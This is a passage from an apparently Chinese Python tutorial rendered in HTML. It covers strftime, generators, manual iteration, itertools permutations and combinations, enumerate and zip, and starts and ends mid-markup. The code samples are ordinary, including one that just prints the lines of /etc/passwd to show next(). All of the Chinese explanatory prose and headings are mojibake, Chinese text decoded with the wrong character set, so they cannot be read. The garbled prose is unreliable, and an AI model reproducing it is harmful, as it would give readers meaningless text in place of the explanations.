class="number">57</span>, <span class="number">13</span>, <span class="number">378621</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nice_z = datetime.strftime(z,<span class="string">'%A %B %d %Y'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nice_z</span><br><span class="line"><span class="string">'Monday October 09 2023'</span></span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>strptime()</code>çš„æ€§èƒ½è¾ƒå·®ï¼Œå› ä¸ºå®ƒæ˜¯ä½¿ç”¨çº¯<code>python</code>å®ç°ï¼Œå¹¶ä¸”å¿…é¡»å¤„ç†æ‰€æœ‰çš„ç³»ç»Ÿæœ¬åœ°è®¾ç½®ï¼Œå› æ­¤å¦‚æœåœ¨ä»£ç ä¸­éœ€è¦è§£æå¤§é‡çš„æ—¥æœŸå¹¶ä¸”å·²çŸ¥æ—¥æœŸå­—ç¬¦ä¸²çš„ç¡®åˆ‡æ ¼å¼ï¼Œå¯ä»¥è‡ªå®šä¹‰å®ç°æ—¥æœŸè§£æå‡½æ•°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_ymd</span><span class="params">(s)</span>:</span></span><br><span class="line">    year_s, mon_s, day_s = s.split(<span class="string">'-'</span>)</span><br><span class="line">    <span class="keyword">return</span> datetime(int(year_s), int(mon_s), int(day_s))</span><br></pre></td></tr></table></figure><h3 id="è¿­ä»£å™¨å’Œç”Ÿæˆå™¨"><a href="#è¿­ä»£å™¨å’Œç”Ÿæˆå™¨" class="headerlink" title="è¿­ä»£å™¨å’Œç”Ÿæˆå™¨"></a>è¿­ä»£å™¨å’Œç”Ÿæˆå™¨</h3><h4 id="æ‰‹åŠ¨éå†è¿­ä»£å™¨"><a href="#æ‰‹åŠ¨éå†è¿­ä»£å™¨" class="headerlink" title="æ‰‹åŠ¨éå†è¿­ä»£å™¨"></a>æ‰‹åŠ¨éå†è¿­ä»£å™¨</h4><p>ä¸ºäº†æ‰‹åŠ¨çš„éå†å¯è¿­ä»£å¯¹è±¡ï¼Œä½¿ç”¨<code>next()</code>å‡½æ•°å¹¶åœ¨ä»£ç ä¸­æ•è·<code>StopIteration</code>å¼‚å¸¸ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manual_iter</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/etc/passwd'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = next(f)</span><br><span class="line">                print(line, end=<span class="string">''</span>)</span><br><span class="line">        <span class="keyword">except</span> StopIteration:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">a = iter(a)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b = next(a)</span><br><span class="line">        print(b, end=<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">except</span> StopIteration:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨ç”Ÿæˆå™¨åˆ›å»ºæ–°çš„è¿­ä»£æ¨¡å¼"><a href="#ä½¿ç”¨ç”Ÿæˆå™¨åˆ›å»ºæ–°çš„è¿­ä»£æ¨¡å¼" class="headerlink" title="ä½¿ç”¨ç”Ÿæˆå™¨åˆ›å»ºæ–°çš„è¿­ä»£æ¨¡å¼"></a>ä½¿ç”¨ç”Ÿæˆå™¨åˆ›å»ºæ–°çš„è¿­ä»£æ¨¡å¼</h4><p>å¦‚æœæƒ³å®ç°ä¸€ç§æ–°çš„è¿­ä»£æ¨¡å¼ï¼Œä½¿ç”¨ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°æ¥å®šä¹‰å®ƒï¼Œå¦‚ä¸‹æ˜¯ä¸€ä¸ªç”Ÿäº§æŸä¸ªèŒƒå›´å†…æµ®ç‚¹æ•°çš„ç”Ÿæˆå™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">frange</span><span class="params">(start, stop, increment)</span>:</span></span><br><span class="line">    x = start</span><br><span class="line">    <span class="keyword">while</span> x &lt; stop:</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line">        x += increment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> frange(<span class="number">0</span>, <span class="number">4</span>, <span class="number">0.5</span>):</span><br><span class="line">    print(n)</span><br><span class="line"></span><br><span class="line">print(list(frange(<span class="number">0</span>, <span class="number">4</span>, <span class="number">0.5</span>)))</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°ä¸»è¦ç‰¹å¾æ˜¯å®ƒåªä¼šå›åº”åœ¨è¿­ä»£ä¸­ä½¿ç”¨åˆ°çš„<code>next</code>æ“ä½œã€‚ ä¸€æ—¦ç”Ÿæˆå™¨å‡½æ•°è¿”å›é€€å‡ºï¼Œè¿­ä»£ç»ˆæ­¢ã€‚æˆ‘ä»¬åœ¨è¿­ä»£ä¸­é€šå¸¸ä½¿ç”¨çš„<code>for</code>è¯­å¥ä¼šè‡ªåŠ¨å¤„ç†è¿™äº›ç»†èŠ‚</p><h4 id="åå‘è¿­ä»£"><a href="#åå‘è¿­ä»£" class="headerlink" title="åå‘è¿­ä»£"></a>åå‘è¿­ä»£</h4><p>ä½¿ç”¨å†…ç½®çš„<code>reversed()</code>å‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> reversed(a):</span><br><span class="line"><span class="meta">... </span>    print(x)</span><br><span class="line">...</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="è¿­ä»£å™¨åˆ‡ç‰‡"><a href="#è¿­ä»£å™¨åˆ‡ç‰‡" class="headerlink" title="è¿­ä»£å™¨åˆ‡ç‰‡"></a>è¿­ä»£å™¨åˆ‡ç‰‡</h4><p>å¦‚æœæƒ³å¾—åˆ°ä¸€ä¸ªç”±è¿­ä»£å™¨ç”Ÿæˆçš„åˆ‡ç‰‡å¯¹è±¡ï¼Œä½†æ˜¯æ ‡å‡†åˆ‡ç‰‡æ“ä½œå¹¶ä¸èƒ½åšåˆ°ï¼Œå¯ä»¥ä½¿ç”¨<code>itertools.islice()</code>åšåˆ‡ç‰‡æ“ä½œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">c = count(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#æ ‡å‡†åˆ‡ç‰‡æŠ¥é”™</span></span><br><span class="line">c[<span class="number">10</span>:<span class="number">20</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"test.py"</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">'generator'</span> object <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br><span class="line"><span class="comment">#ä½¿ç”¨itertools.islice()æ“ä½œ</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.islice(c, <span class="number">10</span>, <span class="number">20</span>):</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure><p>è¿­ä»£å™¨å’Œç”Ÿæˆå™¨ä¸èƒ½ä½¿ç”¨æ ‡å‡†çš„åˆ‡ç‰‡æ“ä½œï¼Œå› ä¸ºå®ƒä»¬çš„é•¿åº¦äº‹å…ˆæˆ‘ä»¬å¹¶ä¸çŸ¥é“(å¹¶ä¸”ä¹Ÿæ²¡æœ‰å®ç°ç´¢å¼•)ã€‚ å‡½æ•°<code>islice()</code>è¿”å›ä¸€ä¸ªå¯ä»¥ç”ŸæˆæŒ‡å®šå…ƒç´ çš„è¿­ä»£å™¨ï¼Œå®ƒé€šè¿‡éå†å¹¶ä¸¢å¼ƒç›´åˆ°åˆ‡ç‰‡å¼€å§‹ç´¢å¼•ä½ç½®çš„æ‰€æœ‰å…ƒç´ ã€‚ ç„¶åæ‰å¼€å§‹ä¸€ä¸ªä¸ªçš„è¿”å›å…ƒç´ ï¼Œå¹¶ç›´åˆ°åˆ‡ç‰‡ç»“æŸç´¢å¼•ä½ç½®ã€‚è¿™é‡Œè¦ç€é‡å¼ºè°ƒçš„ä¸€ç‚¹æ˜¯<code>islice()</code>ä¼šæ¶ˆè€—æ‰ä¼ å…¥çš„è¿­ä»£å™¨ä¸­çš„æ•°æ®ã€‚å¿…é¡»è€ƒè™‘åˆ°è¿­ä»£å™¨æ˜¯ä¸å¯é€†çš„è¿™ä¸ªäº‹å®ã€‚å¦‚æœä½ éœ€è¦ä¹‹åå†æ¬¡è®¿é—®è¿™ä¸ªè¿­ä»£å™¨çš„è¯ï¼Œé‚£ä½ å°±å¾—å…ˆå°†å®ƒé‡Œé¢çš„æ•°æ®æ”¾å…¥ä¸€ä¸ªåˆ—è¡¨ä¸­ã€‚</p><h4 id="æ’åˆ—ç»„åˆçš„è¿­ä»£"><a href="#æ’åˆ—ç»„åˆçš„è¿­ä»£" class="headerlink" title="æ’åˆ—ç»„åˆçš„è¿­ä»£"></a>æ’åˆ—ç»„åˆçš„è¿­ä»£</h4><p>å¦‚æœæƒ³è¿­ä»£éå†ä¸€ä¸ªé›†åˆä¸­å…ƒç´ çš„æ‰€æœ‰å¯èƒ½çš„æ’åˆ—ç»„åˆï¼Œ<code>itertools</code>æä¾›äº†ä¸‰ä¸ªå‡½æ•°æ¥è§£å†³è¿™ç±»é—®é¢˜ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯<code>itertools.permutations()</code>ï¼Œå®ƒæ¥å—ä¸€ä¸ªé›†åˆå¹¶äº§ç”Ÿä¸€ä¸ªå…ƒç»„åºåˆ—ï¼Œæ¯ä¸ªå…ƒç»„ç”±é›†åˆä¸­æ‰€æœ‰å…ƒç´ çš„ä¸€ä¸ªå¯èƒ½æ’åˆ—ç»„æˆã€‚ ä¹Ÿå°±æ˜¯è¯´é€šè¿‡æ‰“ä¹±é›†åˆä¸­å…ƒç´ æ’åˆ—é¡ºåºç”Ÿæˆä¸€ä¸ªå…ƒç»„ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> permutations(items):</span><br><span class="line"><span class="meta">... </span>    print(p)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³å¾—åˆ°æŒ‡å®šé•¿åº¦çš„æ‰€æœ‰æ’åˆ—ï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªå¯é€‰çš„é•¿åº¦å‚æ•°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> permutations(items,<span class="number">2</span>):</span><br><span class="line"><span class="meta">... </span>    print(p)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'b'</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>itertools.combinations()</code>å¯å¾—åˆ°è¾“å…¥é›†åˆä¸­å…ƒç´ çš„æ‰€æœ‰ç»„åˆï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations(items,<span class="number">3</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations(items,<span class="number">2</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations(items,<span class="number">1</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>,)</span><br><span class="line">(<span class="string">'b'</span>,)</span><br><span class="line">(<span class="string">'c'</span>,)</span><br></pre></td></tr></table></figure><p>å¯¹äº<code>combinations()</code>æ¥è®²ï¼Œå…ƒç´ é¡ºåºå·²ç»ä¸é‡è¦äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>(&#39;a&#39;,&#39;b&#39;)</code>å’Œ<code>(&#39;b&#39;,&#39;a&#39;)</code>æ˜¯ä¸€æ ·çš„ã€‚</p><p>åœ¨è®¡ç®—ç»„åˆçš„æ—¶å€™ï¼Œä¸€æ—¦å…ƒç´ è¢«é€‰å–å°±ä¼šä»åé€‰ä¸­å‰”é™¤æ‰ï¼Œè€Œå‡½æ•°<code>itertools.combinations_with_replacement()</code>å…è®¸åŒä¸€ä¸ªå…ƒç´ è¢«é€‰æ‹©å¤šæ¬¡ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations_with_replacement</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>items = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> combinations_with_replacement(items,<span class="number">3</span>):</span><br><span class="line"><span class="meta">... </span>    print(c)</span><br><span class="line">...</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'c'</span>)</span><br><span class="line">(<span class="string">'c'</span>, <span class="string">'c'</span>, <span class="string">'c'</span>)</span><br></pre></td></tr></table></figure><h4 id="åºåˆ—ä¸Šç´¢å¼•å€¼è¿­ä»£"><a href="#åºåˆ—ä¸Šç´¢å¼•å€¼è¿­ä»£" class="headerlink" title="åºåˆ—ä¸Šç´¢å¼•å€¼è¿­ä»£"></a>åºåˆ—ä¸Šç´¢å¼•å€¼è¿­ä»£</h4><p>ä¸€èˆ¬å†…ç½®çš„<code>enumerate()</code>å‡½æ•°å¯ä»¥å¾ˆå¥½çš„å¤„ç†è¯¥é—®é¢˜ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> idx,val <span class="keyword">in</span> enumerate(a):</span><br><span class="line"><span class="meta">... </span>    print(idx,val)</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure><p>ä¸ºäº†æŒ‰ç…§ä¼ ç»Ÿè¡Œå·è¾“å‡ºï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªå¼€å§‹å‚æ•°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> idx,val <span class="keyword">in</span> enumerate(a,<span class="number">1</span>):</span><br><span class="line"><span class="meta">... </span>    print(idx,val)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> a</span><br><span class="line"><span class="number">2</span> b</span><br><span class="line"><span class="number">3</span> c</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µåœ¨ä½ éå†æ–‡ä»¶æ—¶æƒ³åœ¨é”™è¯¯æ¶ˆæ¯ä¸­ä½¿ç”¨è¡Œå·å®šä½æ—¶éå¸¸æœ‰ç”¨ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_data</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> lineno, line <span class="keyword">in</span> enumerate(f, <span class="number">1</span>):</span><br><span class="line">            fields = line.split()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                count = int(fields[<span class="number">1</span>])</span><br><span class="line">                ...</span><br><span class="line">            <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">'Line &#123;&#125;: Parse error: &#123;&#125;'</span>.format(lineno, e))</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç‚¹å¯èƒ½å¹¶ä¸å¾ˆé‡è¦ï¼Œä½†æ˜¯ä¹Ÿå€¼å¾—æ³¨æ„ï¼Œ æœ‰æ—¶å€™å½“ä½ åœ¨ä¸€ä¸ªå·²ç»è§£å‹åçš„å…ƒç»„åºåˆ—ä¸Šä½¿ç”¨<code>enumerate()</code>å‡½æ•°æ—¶å¾ˆå®¹æ˜“è°ƒå…¥é™·é˜±ã€‚ ä½ å¾—åƒä¸‹é¢æ­£ç¡®çš„æ–¹å¼è¿™æ ·å†™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [ (<span class="number">1</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">5</span>, <span class="number">6</span>), (<span class="number">7</span>, <span class="number">8</span>) ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Correct!</span></span><br><span class="line"><span class="keyword">for</span> n, (x, y) <span class="keyword">in</span> enumerate(data):</span><br><span class="line">    ...</span><br><span class="line"><span class="comment"># Error!</span></span><br><span class="line"><span class="keyword">for</span> n, x, y <span class="keyword">in</span> enumerate(data):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h4 id="åŒæ—¶è¿­ä»£å¤šä¸ªåºåˆ—"><a href="#åŒæ—¶è¿­ä»£å¤šä¸ªåºåˆ—" class="headerlink" title="åŒæ—¶è¿­ä»£å¤šä¸ªåºåˆ—"></a>åŒæ—¶è¿­ä»£å¤šä¸ªåºåˆ—</h4><p>ä¸ºäº†åŒæ—¶è¿­ä»£å¤šä¸ªåºåˆ—ï¼Œå¯ä»¥ä½¿ç”¨<code>zip()</code>å‡½æ•°ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b =[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b):</span><br><span class="line"><span class="meta">... </span>    print(x,y)</span><br><span class="line">...</span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">8</span></span><br><span class="line"><span class="number">9</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p><code>zip(a, b)</code>ä¼šç”Ÿæˆä¸€ä¸ªå¯è¿”å›å…ƒç»„<code>(x, y)</code>çš„è¿­ä»£å™¨ï¼Œå…¶ä¸­<code>x</code>æ¥è‡ª<code>a</code>ï¼Œ<code>y</code>æ¥è‡ª<code>b</code>ã€‚ ä¸€æ—¦å…¶ä¸­æŸä¸ªåºåˆ—åˆ°åº•ç»“å°¾ï¼Œè¿­ä»£å®£å‘Šç»“æŸã€‚ å› æ­¤è¿­ä»£é•¿åº¦è·Ÿå‚æ•°ä¸­æœ€çŸ­åºåˆ—é•¿åº¦ä¸€è‡´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = [<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'s'</span>,<span class="string">'s'</span>,<span class="string">'m'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> zip(a,b):</span><br><span class="line"><span class="meta">... </span>    print(i)</span><br><span class="line">...</span><br><span class="line">(<span class="number">1</span>, <span class="string">'e'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'l'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'s'</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å¸Œæœ›å’Œæœ€çŸ­åºåˆ—ä¿æŒä¸€è‡´ï¼Œå¯ä»¥ä½¿ç”¨<code>itertools.zip_longest()</code>å‡½æ•°æ¥ä»£æ›¿ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 